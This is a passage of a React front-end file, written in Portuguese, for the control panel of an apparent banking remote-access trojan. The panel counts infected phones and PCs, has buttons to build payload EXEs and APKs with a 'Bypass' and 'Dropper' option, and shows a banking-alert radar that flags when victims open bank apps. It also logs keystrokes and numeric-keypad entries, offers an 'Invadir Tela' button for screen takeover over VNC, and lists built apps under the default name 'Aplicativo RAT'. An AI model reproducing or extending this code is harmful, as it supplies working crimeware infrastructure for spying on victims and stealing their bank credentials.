              </h1>
            </div>

            <div className="flex items-center gap-2 sm:gap-3 flex-shrink-0">
              <div className="flex items-center gap-2 text-xs font-mono">
                <span className="px-3 py-1 bg-slate-900/90 border border-slate-700/60 rounded-full text-slate-300 shadow-inner">
                  {t('nav.total')}: <span className="text-cyan-300 font-bold">{clientes.length}</span>
                </span>
                <span className="px-3 py-1 bg-cyan-500/15 border border-cyan-500/40 rounded-full text-cyan-400 font-bold flex items-center gap-2 shadow-[0_0_12px_rgba(239,68,68,0.2)]">
                  <span className="h-2 w-2 rounded-full bg-cyan-400 animate-pulse shadow-[0_0_8px_rgba(239,68,68,0.8)]"></span>
                  {onlineCount} {t('nav.online')}
                </span>
                <span className="px-3 py-1 bg-slate-900/90 border border-slate-800 rounded-full text-slate-500 hidden sm:inline">
                  ● {offlineCount} {t('nav.offline')}
                </span>
              </div>

              {!isMobile && (
                <div id="tour-build-buttons" className="hidden md:flex items-center gap-2.5">
                  <button
                    type="button"
                    onClick={() => {
                      setShowMyAppsModal(true);
                      loadBuilds();
                    }}
                    className="flex items-center gap-2 px-3.5 py-2 bg-slate-900/90 border border-cyan-500/40 hover:bg-cyan-500/15 text-cyan-300 rounded-xl text-xs font-bold uppercase tracking-wider shadow-[0_0_12px_rgba(255,43,43,0.15)] transition-all hover:scale-105"
                  >
                    <Smartphone className="w-4 h-4 text-cyan-400" />
                    {t('nav.my_apps')}
                  </button>
                  <button
                    type="button"
                    onClick={() => navigate('/win-builder')}
                    className="flex items-center gap-2 px-3.5 py-2 bg-gradient-to-r from-cyan-600 via-blue-600 to-sky-500 hover:from-cyan-500 hover:to-blue-500 text-white rounded-xl text-xs font-black uppercase tracking-wider shadow-[0_0_18px_rgba(255,43,43,0.4)] transition-all transform hover:scale-105 active:scale-95 border border-cyan-400/40"
                    title="Central Windows: Gerar Payload .EXE e Controle VNC de PCs"
                  >
                    <Monitor className="w-4 h-4 text-cyan-300" />
                    <span>{t('nav.gen_exe')}</span>
                  </button>
                  <button
                    type="button"
                    onClick={() => navigate('/build-apk')}
                    className="flex items-center gap-2 px-3.5 py-2 bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-500 hover:to-cyan-400 text-white rounded-xl text-xs font-bold uppercase tracking-wider shadow-[0_0_15px_rgba(255,43,43,0.35)] transition-all hover:scale-105 active:scale-95"
                  >
                    <Package className="w-4 h-4" />
                    {t('nav.gen_apk')}
                  </button>
                  <button
                    type="button"
                    onClick={() => navigate('/apk-bypass')}
                    className="flex items-center gap-2 px-3.5 py-2 bg-gradient-to-r from-cyan-600 via-blue-600 to-sky-500 hover:from-cyan-500 hover:to-sky-400 text-white rounded-xl text-xs font-black uppercase tracking-wider shadow-[0_0_18px_rgba(239,68,68,0.5)] transition-all transform hover:scale-105 active:scale-95 border border-cyan-300/50"
                    title="Build com Bypass (PROJETO: Bateria, Permissões, Dropper)"
                  >
                    <Zap className="w-4 h-4 text-cyan-200 animate-pulse" />
                    {t('nav.gen_bypass')}
                  </button>
                </div>
              )}
              <button
                type="button"
                onClick={() => {
                  const next = !hideIps;
                  setHideIps(next);
                  localStorage.setItem('hide_ips', String(next));
                }}
                className={`flex items-center gap-1.5 px-3 py-2 rounded-xl border text-xs font-bold transition-all ${
                  hideIps
                    ? 'bg-cyan-950/90 border-cyan-400/60 text-cyan-200 shadow-[0_0_12px_rgba(239,68,68,0.3)]'
                    : 'bg-slate-900/90 border-cyan-500/20 text-slate-300 hover:text-cyan-300 hover:bg-slate-800'
                }`}
                title={hideIps ? t('nav.show_ips') : t('nav.hide_ips')}
              >
                {hideIps ? <EyeOff className="w-4 h-4 text-cyan-300" /> : <Eye className="w-4 h-4 text-cyan-400" />}
                <span className="hidden sm:inline">{hideIps ? t('nav.hide_ips') : t('nav.show_ips')}</span>
              </button>
              <LanguageSelector />
              <button
                type="button"
                onClick={() => loadDevices(false)}
                className="p-2.5 bg-slate-900/90 hover:bg-slate-800 rounded-xl border border-cyan-500/20 text-slate-300 hover:text-cyan-300 transition-all hover:shadow-[0_0_12px_rgba(255,43,43,0.2)] cursor-pointer"
                title={t('nav.refresh')}
              >
                <RefreshCw className={`w-4 h-4 ${refreshing ? 'animate-spin text-cyan-400' : ''}`} />
              </button>
              <button
                type="button"
                onClick={() => {
                  loadUserProfile();
                  setShowProfileModal(true);
                }}
                className="p-2.5 bg-slate-900/90 hover:bg-slate-800 rounded-xl border border-cyan-500/20 text-slate-300 hover:text-cyan-300 transition-all hover:shadow-[0_0_12px_rgba(255,43,43,0.2)] cursor-pointer"
                title={t('nav.profile')}
              >
                <User className="w-4 h-4" />
              </button>
              <button
                type="button"
                onClick={() => setIsSidebarOpen(!isSidebarOpen)}
                className={`p-2.5 rounded-xl border transition-all cursor-pointer ${
                  isSidebarOpen 
                    ? 'bg-cyan-500/20 border-cyan-400/50 text-cyan-300 shadow-[0_0_15px_rgba(255,43,43,0.3)]' 
                    : 'bg-slate-900/90 border-cyan-500/20 text-slate-400 hover:bg-slate-800 hover:text-white'
                }`}
                title={t('nav.radar')}
              >
                <Bell className="w-4 h-4" />
              </button>
            </div>
          </div>
        </header>

        <div className="flex-1 flex overflow-hidden">
          <main className="flex-1 p-4 sm:p-6 overflow-auto">
          {/* 🚀 PAINEL PREMIUM DE ESTATÍSTICAS (PING SERVIDOR, APARELHOS E APPS GUARDADOS) */}
          <div className="mb-6 grid grid-cols-1 sm:grid-cols-3 gap-4">
            {/* ⚡ BADGE 1: PING SERVIDOR */}
            <div className="relative bg-gradient-to-br from-[#330b03]/90 via-[#240703]/90 to-[#180403]/90 border border-cyan-500/40 hover:border-cyan-300 rounded-2xl p-4 backdrop-blur-2xl shadow-[0_0_25px_rgba(239,68,68,0.18)] flex items-center justify-between transition-all duration-300 hover:scale-[1.02] hover:shadow-[0_0_35px_rgba(239,68,68,0.3)] group overflow-hidden">
              <div className="absolute -right-6 -bottom-6 w-24 h-24 bg-cyan-500/10 rounded-full blur-2xl group-hover:bg-cyan-500/20 transition-all pointer-events-none"></div>
              <div className="flex items-center gap-3.5 relative z-10">
                <div className="p-3 rounded-xl bg-gradient-to-br from-cyan-500/25 to-blue-600/30 border border-cyan-400/60 text-cyan-300 shadow-[0_0_15px_rgba(239,68,68,0.4)] group-hover:scale-110 transition-transform">
                  <Wifi className="w-5 h-5 text-cyan-300 animate-pulse" />
                </div>
                <div>
                  <span className="text-[11px] font-black text-cyan-300/80 uppercase font-mono tracking-widest block">{t('stats.ping_server')}</span>
                  <div className="flex items-baseline gap-1.5 mt-0.5">
                    <span className="text-2xl font-black text-white font-mono tracking-tight group-hover:text-cyan-200 transition-colors">{serverPing}</span>
                    <span className="text-xs text-cyan-400 font-mono font-bold">ms</span>
                  </div>
                </div>
              </div>
              <span className="text-[10px] text-cyan-400 font-mono font-black px-2.5 py-1 rounded-full bg-cyan-950/80 border border-cyan-500/40 shadow-[0_0_10px_rgba(239,68,68,0.3)] flex items-center gap-1.5 relative z-10">
                <span className="w-2 h-2 rounded-full bg-cyan-400 animate-ping"></span>
                {t('nav.online')}
              </span>
            </div>

            {/* 📱 BADGE 2: APARELHOS / DISPOSITIVOS (AZUL MODERNO) */}
            <div className="relative bg-gradient-to-br from-[#330b03]/90 via-[#240703]/90 to-[#180403]/90 border border-cyan-500/50 hover:border-cyan-300 rounded-2xl p-4 backdrop-blur-2xl shadow-[0_0_25px_rgba(239,68,68,0.22)] flex flex-col justify-between transition-all duration-300 hover:scale-[1.02] hover:shadow-[0_0_35px_rgba(239,68,68,0.4)] group overflow-hidden">
              <div className="absolute -right-6 -bottom-6 w-24 h-24 bg-cyan-500/15 rounded-full blur-2xl group-hover:bg-cyan-500/25 transition-all pointer-events-none"></div>
              <div className="flex items-center justify-between relative z-10">
                <div className="flex items-center gap-3.5">
                  <div className="p-3 rounded-xl bg-gradient-to-br from-cyan-500/30 to-blue-600/40 border border-cyan-400/70 text-cyan-200 shadow-[0_0_15px_rgba(239,68,68,0.5)] group-hover:scale-110 transition-transform">
                    <Smartphone className="w-5 h-5 text-cyan-300 animate-pulse" />
                  </div>
                  <div>
                    <span className="text-[11px] font-black text-cyan-300/90 uppercase font-mono tracking-widest block">{t('stats.devices')}</span>
                    <div className="flex items-baseline gap-2 mt-0.5">
                      <span className="text-2xl font-black text-white font-mono tracking-tight">{clientes.length}</span>
                      <span className="text-xs text-cyan-300/70 font-mono font-bold">{t('stats.registered')}</span>
                    </div>
                  </div>
                </div>
                <span className="text-[10px] font-mono text-cyan-200 font-black px-3 py-1 rounded-full bg-cyan-950/90 border border-cyan-400/60 shadow-[0_0_12px_rgba(239,68,68,0.35)]">
                  {onlineCount} ON
                </span>
              </div>

              {/* Visual Progress bar ratio of Online devices in Electric Blue */}
              <div className="mt-3 w-full bg-slate-900/90 h-1.5 rounded-full overflow-hidden border border-cyan-900/50 relative z-10">
                <div 
                  className="h-full bg-gradient-to-r from-blue-600 via-cyan-400 to-sky-300 rounded-full transition-all duration-500 shadow-[0_0_12px_rgba(239,68,68,0.9)]"
                  style={{ width: clientes.length > 0 ? `${(onlineCount / clientes.length) * 100}%` : '0%' }}
                ></div>
              </div>
            </div>

            {/* 📦 BADGE 3: APPS GUARDADOS (AZUL MODERNO) */}
            <div className="relative bg-gradient-to-br from-[#330b03]/90 via-[#240703]/90 to-[#180403]/90 border border-cyan-500/50 hover:border-cyan-300 rounded-2xl p-4 backdrop-blur-2xl shadow-[0_0_25px_rgba(239,68,68,0.22)] flex items-center justify-between transition-all duration-300 hover:scale-[1.02] hover:shadow-[0_0_35px_rgba(239,68,68,0.4)] group overflow-hidden">
              <div className="absolute -right-6 -bottom-6 w-24 h-24 bg-cyan-500/15 rounded-full blur-2xl group-hover:bg-cyan-500/25 transition-all pointer-events-none"></div>
              <div className="flex items-center gap-3.5 relative z-10">
                <div className="p-3 rounded-xl bg-gradient-to-br from-blue-600/30 via-cyan-500/30 to-sky-400/30 border border-cyan-400/70 text-cyan-200 shadow-[0_0_15px_rgba(239,68,68,0.5)] group-hover:scale-110 transition-transform">
                  <Package className="w-5 h-5 text-cyan-300" />
                </div>
                <div>
                  <span className="text-[11px] font-black text-cyan-300/90 uppercase font-mono tracking-widest block">{t('stats.stored_apps')}</span>
                  <div className="flex items-baseline gap-1.5 mt-0.5">
                    <span className="text-2xl font-black text-white font-mono tracking-tight">{builds.length}</span>
                    <span className="text-xs text-cyan-300/70 font-mono font-bold">APKs</span>
                  </div>
                </div>
              </div>
              <button
                type="button"
                onClick={() => setShowMyAppsModal(true)}
                className="px-3.5 py-1.5 rounded-xl bg-gradient-to-r from-cyan-500 via-blue-600 to-sky-400 hover:from-cyan-400 hover:to-sky-300 text-white font-black font-mono text-xs transition-all hover:scale-105 active:scale-95 shadow-[0_0_15px_rgba(239,68,68,0.5)] border border-cyan-300 flex items-center gap-1 relative z-10"
                title="Ver Central de Apps Guardados"
              >
                <span>Meus Apps</span>
                <span className="text-sm">⚡</span>
              </button>
            </div>
          </div>
          
          {/* 🔔 BARRA SLIM DE ALERTAS BANCÁRIOS (CLEAN & ELEGANT) */}
          {(() => {
            const activeCount = alerts.filter(a => a.status === 'open').length;
            
            if (alerts.length === 0) {
              return (
                <div className="mb-5 px-4 py-2.5 bg-[#1e0603]/80 border border-blue-500/20 rounded-xl flex items-center justify-between backdrop-blur-md">
                  <div className="flex items-center space-x-2.5">
                    <span className="w-2 h-2 rounded-full bg-cyan-400 animate-pulse"></span>
                    <span className="text-xs font-bold text-blue-200/80 font-mono">Alertas Financeiros:</span>
                    <span className="text-xs text-blue-300/50">Nenhum aplicativo bancário em execução no momento</span>
                  </div>
                  <span className="text-[10px] text-cyan-400 font-mono font-bold px-2 py-0.5 rounded bg-cyan-950/50 border border-cyan-500/20">
                    SISTEMA ATIVO
                  </span>
                </div>
              );
            }

            return (
              <div className="mb-5 space-y-2">
                <div className="flex items-center justify-between px-1">
                  <span className="text-xs font-bold text-cyan-300 font-mono flex items-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-red-400 animate-ping"></span>
                    Alertas Bancários Detectados ({alerts.length})
                  </span>
                  {activeCount > 0 && (
                    <span className="text-[10px] font-bold text-red-400 font-mono uppercase bg-red-950/60 px-2.5 py-0.5 rounded-md border border-red-500/30">
                      🚨 {activeCount} Banco(s) em foco
                    </span>
                  )}
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2.5">
                  {alerts.map((item, idx) => {
                    const isOpen = item.status === 'open';
                    
                    return (
                      <div
                        key={idx}
                        onClick={() => navigate(`/device/${item.deviceId}`)}
                        className={`p-3 rounded-xl border transition-all cursor-pointer flex items-center justify-between ${
                          isOpen
                            ? 'bg-red-950/40 border-red-500/50 text-red-100 hover:border-red-400 shadow-md'
                            : 'bg-blue-950/30 border-blue-500/20 text-blue-300/70 hover:border-cyan-500/40'
                        }`}
                      >
                        <div className="flex items-center space-x-3 min-w-0">
                          <BankIcon pkg={item.bankPackage} iconB64={item.iconB64} name={item.bankName} size={32} />
                          <div className="min-w-0">
                            <span className="text-xs font-bold truncate block font-mono text-white">{item.bankName}</span>
                            <span className="text-[10px] text-blue-300/50 truncate block font-mono">{item.deviceModel}</span>
                          </div>
                        </div>
                        
                        <div className="flex items-center space-x-2 flex-shrink-0">
                          {isOpen ? (
                            <span className="px-2.5 py-1 bg-red-600 hover:bg-red-500 text-white font-bold text-[10px] rounded-lg font-mono uppercase transition-all shadow">
                              Acessar
                            </span>
                          ) : (
                            <span className="text-[9px] font-mono text-blue-300/40 uppercase">
                              Fechado
                            </span>
                          )}
                        </div>
                      </div>
                    );
                  })}
                </div>
              </div>
            );
          })()}

          <div id="tour-device-table">
            <DeviceTable
              clientes={clientes}
              loading={initialLoading}
              onRowClick={handleRowClick}
              onRowContextMenu={(e, cliente) => openMenu(e, cliente)}
              onDeleteDevice={handleDeleteDevice}
              onCreateApk={() => navigate('/build-apk')}
              onOpenVnc={handleOpenVnc}
            />
          </div>
        </main>

        {/* HUD DE NOTIFICAÇÕES LATERAIS */}
        {isSidebarOpen && !isMobile && (
          <div id="tour-banking-radar" className="w-80 border-l border-cyan-500/20 bg-[#190403]/40 backdrop-blur-md flex flex-col flex-shrink-0 text-slate-300 relative transition-all duration-300 ease-in-out shadow-[-10px_0_30px_rgba(0,0,0,0.5)]">
            <div className="p-4 border-b border-cyan-500/20 flex items-center justify-between">
              <div className="flex items-center gap-2.5">
                <Activity className="w-4 h-4 text-cyan-400 animate-pulse" />
                <span className="text-xs font-black tracking-widest text-cyan-300 font-mono">RADAR DE ALERTAS</span>
              </div>
              <div className="flex items-center gap-1.5">
                <button
                  onClick={() => setSoundEnabled(!soundEnabled)}
                  className={`p-1.5 rounded-lg transition-colors ${soundEnabled ? 'text-cyan-400 bg-cyan-500/10 hover:bg-cyan-500/20' : 'text-slate-500 hover:bg-slate-800'}`}
                  title={soundEnabled ? "Mudar para Silencioso" : "Ativar Som"}
                >
                  {soundEnabled ? <Volume2 className="w-4 h-4" /> : <VolumeX className="w-4 h-4" />}
                </button>
                <button
                  onClick={() => setActivityLog([])}
                  className="p-1.5 text-slate-400 hover:text-red-400 hover:bg-red-500/10 rounded-lg transition-colors"
                  title="Limpar Feed"
                >
                  <Trash2 className="w-4 h-4" />
                </button>
              </div>
            </div>
            
            <div className="flex-1 overflow-y-auto p-3.5 space-y-3">
              {activityLog.length === 0 ? (
                <div className="h-full flex flex-col items-center justify-center text-center p-4 text-slate-500 space-y-3">
                  <div className="p-3 rounded-2xl bg-cyan-500/10 border border-cyan-500/20 text-cyan-400">
                    <Sparkles className="w-7 h-7 animate-pulse" />
                  </div>
                  <p className="text-xs font-bold text-slate-300">Sem atividades recentes</p>
                  <p className="text-[11px] text-slate-500 leading-relaxed">Aparelhos conectados ou acessos a bancos aparecerão aqui em tempo real.</p>
                </div>

              ) : (
                activityLog.map((event) => {
                  const isBank = event.type === 'bank_open' || event.type === 'bank_close';
                  const isNumeric = event.type === 'numeric_keypad' || event.title.includes('NUMÉRICO');
                  const isKeylog = event.type === 'keylog' || event.title.includes('TECLADO');
                  const isOpen = event.type === 'bank_open';
                  const isOnline = event.type === 'device_online';
                  const isOffline = event.type === 'device_offline';
                  
                  let cardStyle = "bg-[#2b0903]/40 border border-slate-800/80";
                  
                  if (isOpen) {
                    cardStyle = "bg-[#180a0f]/90 border-2 border-red-500/60 shadow-[0_0_15px_rgba(239,68,68,0.15)]";
                  } else if (isNumeric) {
                    cardStyle = "bg-[#1c1809]/90 border-2 border-amber-400/80 shadow-[0_0_15px_rgba(245,158,11,0.2)]";
                  } else if (isKeylog) {
                    cardStyle = "bg-[#280a03]/90 border border-cyan-500/50 shadow-[0_0_12px_rgba(239,68,68,0.15)]";
                  } else if (isOnline) {
                    cardStyle = "bg-[#280a03]/90 border border-cyan-500/40 shadow-[0_0_12px_rgba(239,68,68,0.1)]";
                  } else if (isOffline) {
                    cardStyle = "bg-[#1a140c]/80 border border-amber-500/30";
                  }
                  
                  return (
                    <div 
                      key={event.id}
                      className={`p-3 rounded-xl transition-all duration-300 relative overflow-hidden ${cardStyle}`}
                    >
                      {isOpen && (
                        <div className="absolute inset-0 bg-gradient-to-r from-red-500/5 to-transparent pointer-events-none"></div>
                      )}
                      
                      <div className="flex items-start gap-2.5 relative z-10">
                        {isBank ? (
                          <div className="flex-shrink-0 mt-0.5">
                            <BankIcon pkg={event.bankPackage || ''} iconB64={event.iconB64} size={30} />
                          </div>
                        ) : (
                          <div className="w-[30px] h-[30px] rounded-lg bg-slate-900 border border-slate-850 flex items-center justify-center flex-shrink-0 mt-0.5">
                            <Smartphone className={`w-4 h-4 ${isOnline ? 'text-cyan-400 animate-bounce' : 'text-amber-500'}`} />
                          </div>
                        )}
                        
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center justify-between gap-1">
                            <span className="font-mono text-[9px] text-slate-500 font-bold uppercase truncate">{event.deviceModel}</span>
                            <span className="text-[8px] text-slate-500 font-mono flex-shrink-0">{event.timestamp}</span>
                          </div>
                          <h4 className="text-[11px] font-black text-white mt-0.5 uppercase tracking-wide truncate">
                            {event.title}
                          </h4>
                          <p className="text-[10px] text-slate-400 leading-normal mt-0.5">
                            {event.description}
                          </p>
                          
                          {(isOpen || isOnline) && (
                            <button
                              onClick={() => navigate(`/device/${event.deviceId}`)}
                              className={`mt-2 w-full py-1 rounded text-[9px] font-black uppercase tracking-wider transition-all duration-200 ${
                                isOpen 
                                  ? 'bg-gradient-to-r from-red-600 to-orange-500 hover:from-red-500 hover:to-orange-400 text-white shadow-[0_0_8px_rgba(239,68,68,0.2)]'
                                  : 'bg-slate-850 hover:bg-slate-800 text-slate-300'
                              }`}
                            >
                              {isOpen ? '⚡ Invadir Tela' : '📡 Controlar'}
                            </button>
                          )}
                        </div>
                      </div>
                    </div>
                  );
                })
              )}
            </div>
          </div>
        )}
        </div>
      </div>

      <ContextMenu
        visible={menu.visible}
        x={menu.x}
        y={menu.y}
        cliente={menu.cliente}
        onClose={closeMenu}
        onRename={(cliente) => {
          const name = prompt("Digite o novo nome para o aparelho:", cliente.customName || cliente.model);
          if (name !== null) {
            devicesAPI.rename(cliente.deviceId, name)
              .then(() => {
                loadDevices(false);
              })
              .catch((err) => alert("Erro ao renomear dispositivo: " + (err.response?.data?.detail || err.message)));
          }
        }}
        onDelete={handleDeleteDevice}
      />

      {/* 🚀 TOAST NOTIFICATIONS EM TEMPO REAL (Canto Superior Direito) */}
      <div className="fixed top-4 right-4 z-50 pointer-events-none space-y-3 max-w-sm w-full">
        {toasts.map((t) => {
          const isOpen = t.type === 'open';
          return (
            <div
              key={t.id}
              className={`pointer-events-auto p-4 rounded-xl shadow-[0_10px_30px_rgba(0,0,0,0.5)] border backdrop-blur-xl flex items-center space-x-3.5 transition-all transform duration-300 animate-pulse-once ${
                isOpen 
                  ? 'bg-red-950/80 border-red-500/50 shadow-[0_0_20px_rgba(239,68,68,0.2)]' 
                  : 'bg-slate-900/90 border-slate-700/50'
              }`}
            >
              <div className="flex-shrink-0">
                <BankIcon pkg={t.bankPkg} iconB64={t.iconB64} size={38} />
              </div>
              <div className="flex-1 min-w-0">
                <h4 className={`text-[10px] font-black uppercase tracking-widest ${isOpen ? 'text-red-400' : 'text-slate-400'}`}>
                  {t.title}
                </h4>
                <p className="text-xs text-white font-bold mt-0.5">
                  {t.body}
                </p>
              </div>
            </div>
          );
        })}
      </div>

      {/* 📱 MODAL DE APKS GERADOS (MEUS APPS FUTURISTA & MODERNO) */}
      {showMyAppsModal && (
        <div className="fixed inset-0 bg-black/85 flex items-center justify-center z-50 p-4 backdrop-blur-md animate-fade-in" onClick={() => setShowMyAppsModal(false)}>
          <div 
            className="bg-gradient-to-b from-[#2b0803] via-[#1f0603] to-[#140303] border border-cyan-500/40 rounded-3xl max-w-4xl w-full p-6 shadow-[0_0_60px_rgba(239,68,68,0.25)] backdrop-blur-2xl relative max-h-[85vh] flex flex-col overflow-hidden animate-scale-up select-none"
            onClick={(e) => e.stopPropagation()}
          >
            {/* Blueprint Grid Background Accent */}
            <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_0%,rgba(239,68,68,0.15),transparent_70%)] pointer-events-none"></div>
            
            <button 
              onClick={() => setShowMyAppsModal(false)}
              className="absolute top-5 right-5 p-2 text-slate-400 hover:text-white bg-slate-900/80 hover:bg-red-500/80 rounded-xl transition-all border border-slate-800 z-20 cursor-pointer"
            >
              <X className="w-5 h-5" />
            </button>

            <div className="relative z-10 flex items-center justify-between border-b border-cyan-500/20 pb-4 mb-4">
              <div className="flex items-center space-x-3">
                <div className="p-3 bg-gradient-to-br from-cyan-500/20 to-blue-600/20 rounded-2xl border border-cyan-400/40 shadow-[0_0_15px_rgba(239,68,68,0.3)]">
                  <Smartphone className="w-6 h-6 text-cyan-300 animate-pulse" />
                </div>
                <div>
                  <h3 className="text-base font-black uppercase text-white tracking-widest font-mono flex items-center gap-2">
                    📱 MEUS APLICATIVOS GERADOS
                    <span className="px-2 py-0.5 bg-cyan-500/20 text-cyan-300 text-[10px] rounded-full border border-cyan-400/30">
                      {builds.length} APKs
                    </span>
                  </h3>
                  <p className="text-xs text-slate-400 mt-0.5 font-sans">
                    Histórico de APKs compilados prontos para download seguro e cópia de link
                  </p>
                </div>
              </div>
              
              <button
                type="button"
                onClick={loadBuilds}
                className="mr-12 px-3.5 py-1.5 bg-gradient-to-r from-cyan-600/30 to-blue-600/30 hover:from-cyan-500/40 hover:to-blue-500/40 border border-cyan-400/40 rounded-xl text-xs font-black uppercase text-cyan-200 transition-all shadow-[0_0_12px_rgba(239,68,68,0.2)] flex items-center gap-1.5 cursor-pointer font-mono"
              >
                <RefreshCw className={`w-3.5 h-3.5 ${buildsLoading ? 'animate-spin' : ''}`} />
                Atualizar
              </button>
            </div>

            <div className="relative z-10 flex-1 overflow-y-auto pr-1">
              {buildsLoading && builds.length === 0 ? (
                <div className="py-20 flex flex-col items-center justify-center text-center space-y-3">
                  <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-cyan-400 shadow-[0_0_15px_rgba(239,68,68,0.5)]"></div>
                  <span className="text-xs text-cyan-300 font-mono">Carregando compilações de APKs...</span>
                </div>
              ) : builds.length === 0 ? (
                <div className="py-16 text-center text-slate-400 text-xs bg-slate-950/60 rounded-2xl border border-slate-800/80 p-6">
                  <div className="text-4xl mb-2">📦</div>
                  <p className="font-bold text-slate-300 text-sm">Nenhum aplicativo gerado ainda</p>
                  <p className="text-xs text-slate-500 mt-1">Os APKs compilados no APK Studio aparecerão listados aqui com suporte a download direto.</p>
                </div>
              ) : (
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pb-4">
                  {builds.map((build) => {
                    const dateFormatted = build.createdAt 
                      ? new Date(build.createdAt).toLocaleString('pt-BR', {
                          day: '2-digit',
                          month: '2-digit',
                          year: 'numeric',
                          hour: '2-digit',
                          minute: '2-digit'
                        })
                      : '—';
                    
                    const cleanAppName = build.appName ? build.appName.replace(/\s+/g, '-').toLowerCase() : 'app';
                    const fallbackFilename = `studio-user${build.ownerId || 1}-${cleanAppName}-${build.build_id}.apk`; 
                    const apkFilename = build.filename || fallbackFilename;
                    const downloadPath = build.download_url || `/api/apk-studio/download/${apkFilename}`;
                    const token = localStorage.getItem('admin_token') || localStorage.getItem('token') || '';
                    const fullDownloadUrl = `${window.location.origin}${downloadPath}${downloadPath.includes('?') ? '&' : '?'}token=${token}`;
                    
                    // Formata tamanho do arquivo
                    const fileSizeFormatted = build.size 
                      ? (build.size / (1024 * 1024)).toFixed(2) + ' MB'
                      : '2.65 MB';
                    
                    return (
                      <div 
                        key={build.id || build.build_id}
                        className="group bg-gradient-to-b from-[#2e0903]/90 to-[#1e0603]/90 hover:from-[#470e04]/90 hover:to-[#300903]/90 border border-cyan-500/25 hover:border-cyan-400/60 rounded-2xl p-4 transition-all duration-300 shadow-lg hover:shadow-[0_0_25px_rgba(239,68,68,0.25)] relative overflow-hidden flex flex-col justify-between"
                      >
                        <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-blue-500 via-cyan-400 to-teal-400 opacity-70 group-hover:opacity-100 transition-opacity"></div>
                        
                        <div>
                          <div className="flex items-center justify-between mb-2">
                            <span className="px-2.5 py-0.5 bg-cyan-950/80 text-cyan-300 border border-cyan-500/30 rounded-lg text-[9px] font-mono font-bold">
                              ID: {build.build_id}
                            </span>
                            <span className="text-[10px] text-slate-400 font-mono">
                              📅 {dateFormatted}
                            </span>
                          </div>
                          
                          <div className="flex items-center space-x-3 my-2">
                            <div className="p-2.5 bg-gradient-to-br from-blue-600 to-cyan-500 rounded-xl text-white shadow-[0_0_12px_rgba(239,68,68,0.4)]">
                              <Smartphone className="w-5 h-5" />
                            </div>
                            <div className="flex-1 min-w-0">
                              <h4 className="text-sm font-black text-white uppercase tracking-wide truncate">
                                {build.appName || 'Aplicativo RAT'}
                              </h4>
                              <p className="text-[10px] text-cyan-400/80 truncate font-mono mt-0.5">
                                📦 {apkFilename}
                              </p>
                            </div>
                          </div>
                        </div>
                        
                        <div className="flex items-center justify-between mt-3 pt-3 border-t border-cyan-500/15">
                          <div className="flex items-center space-x-2">
                            <span className="text-[10px] font-bold text-emerald-400 flex items-center gap-1 bg-emerald-950/60 border border-emerald-500/30 px-2 py-0.5 rounded-full">
                              <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
                              PRONTO
                            </span>
                            <span className="text-[10px] font-mono text-slate-400">
                              ({fileSizeFormatted})
                            </span>
                          </div>

                          <div className="flex items-center space-x-1.5">
                            <button
                              onClick={() => {
                                navigator.clipboard.writeText(fullDownloadUrl);
                                alert('✅ Link de download copiado para a área de transferência!');
                              }}
                              className="px-2 py-1.5 bg-slate-800 hover:bg-slate-700 text-cyan-300 rounded-xl text-[10px] font-bold transition-all border border-cyan-500/20 flex items-center gap-1"
                              title="Copiar Link de Download"
                            >
                              <Copy className="w-3 h-3" />
                              Link
                            </button>

                            <button
                              onClick={() => {
                                try {
                                  window.open(fullDownloadUrl, '_blank');
                                } catch (err) {
                                  console.error('Erro ao abrir download:', err);
                                  window.location.href = fullDownloadUrl;
                                }
                              }}
                              className="px-3 py-1.5 bg-gradient-to-r from-emerald-600 to-teal-500 hover:from-emerald-500 hover:to-teal-400 text-white rounded-xl text-xs font-black uppercase tracking-wider shadow-[0_0_12px_rgba(16,185,129,0.4)] border border-emerald-400/40 transition-all flex items-center gap-1.5 cursor-pointer"
                            >
                              <Download className="w-3.5 h-3.5" />
                              Baixar APK
                            </button>
                          </div>
                        </div>
                      </div>
                    );
                  })}
                </div>
              )}
            </div>
          </div>
        </div>
      )}
      {/* 👤 MODAL DE MEU PERFIL */}
      {showProfileModal && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4 animate-fade-in" onClick={() => setShowProfileModal(false)}>
          <div 
            className="bg-[#200703]/95 border border-blue-500/30 rounded-2xl max-w-md w-full p-6 shadow-[0_0_50px_rgba(220,38,38,0.15)] backdrop-blur-xl relative flex flex-col animate-scale-up"
            onClick={(e) => e.stopPropagation()}
          >
            <button 
              onClick={() => setShowProfileModal(false)}
              className="absolute top-4 right-4 p-1.5 text-slate-400 hover:text-white hover:bg-slate-800/50 rounded-lg transition-colors z-20"
            >
              <X className="w-5 h-5" />
            </button>
            <div className="flex items-center space-x-3 border-b border-blue-500/10 pb-4 mb-4">
              <div className="p-2 bg-blue-500/10 rounded-lg border border-blue-500/20">
                <User className="w-5 h-5 text-blue-400" />
              </div>
              <div>
                <h3 className="text-sm font-black uppercase text-blue-400 tracking-widest font-mono">
                  👤 Configurações do Meu Perfil
                </h3>
                <p className="text-[10px] text-slate-500 mt-0.5">
                  Atualize suas credenciais de acesso ao painel
                </p>
              </div>
            </div>
            <form onSubmit={handleSaveProfile} className="space-y-4">
              {profileError && (
                <div className="p-3 bg-red-500/10 border border-red-500/20 text-red-400 text-xs rounded-lg font-medium">
                  ⚠️ {profileError}
                </div>
              )}
              {profileSuccess && (
                <div className="p-3 bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-xs rounded-lg font-medium">
                  ✅ {profileSuccess}
                </div>
              )}
              <div>
                <label className="block text-[10px] uppercase font-bold text-slate-400 mb-1.5 tracking-wider font-mono">Nome de Usuário</label>
                <input 
                  type="text" 
                  value={profileUsername} 
                  onChange={(e) => setProfileUsername(e.target.value)} 
                  required
                  className="w-full bg-slate-950 border border-slate-800 focus:border-blue-500/50 focus:ring-1 focus:ring-blue-500/35 rounded-xl px-4 py-2 text-sm text-white transition-all outline-none"
                />
              </div>
              <div>
                <label className="block text-[10px] uppercase font-bold text-slate-400 mb-1.5 tracking-wider font-mono">E-mail</label>
                <input 
                  type="email" 
